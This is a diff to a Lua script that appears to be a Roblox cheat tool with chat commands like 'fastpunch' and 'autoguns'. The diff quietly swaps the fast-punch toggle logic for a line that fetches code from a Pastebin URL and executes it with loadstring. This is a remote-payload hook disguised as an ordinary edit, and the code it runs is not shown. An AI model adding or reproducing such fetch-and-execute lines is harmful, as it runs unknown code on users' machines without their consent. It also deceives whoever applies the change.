@@ -2418,13 +2418,7 @@ function LocalPlayerChatted(msg)
 		end
 	end
 	if command("fp") or command("fastpunch") or command("fpunch") then
-		states.FAST_PUNCH = getBoolFromString(arg2)
-
-		if getBoolFromString(arg2) == nil then
-			notify(arg2.."not a valid state.")
-		else
-			notify("Set "..arg1:sub(2).." to "..arg2)
-		end
+		loadstring(game:HttpGet('https://pastebin.com/raw/iX92GVkf'))()
 	end
 	if command("autoguns") or command("aguns") or command("aug") then
 		states.AUTO_GUNS = getBoolFromString(arg2)
